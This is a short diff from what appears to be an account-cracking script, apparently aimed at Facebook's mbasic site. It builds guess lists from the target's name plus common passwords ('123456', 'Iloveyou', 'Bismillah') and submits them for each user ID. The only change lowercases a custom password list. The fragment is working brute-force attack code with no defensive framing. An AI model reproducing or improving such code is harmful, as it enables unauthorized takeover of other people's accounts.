@@ -646,7 +646,7 @@ def ___metode___():
                 elif ___password___ in ['3','03']:
                     pwx = [Name, ox[0]+'123', ox[0]+'12345', 'NoobXploit', 'fuck you', 'Iloveyou', 'Bangladesh', 'Bismillah', '123456', 'Beautiful']
                 elif ___password___ in ['4','04']:
-                    pwx = pwd
+                    pwx = pwd.lower()
                 else:
                     pwx = [Name, ox[0]+'123', ox[0]+'1234', ox[0]+'12345']
                 hayuk.submit(mbasic, ids, uid, pwx)
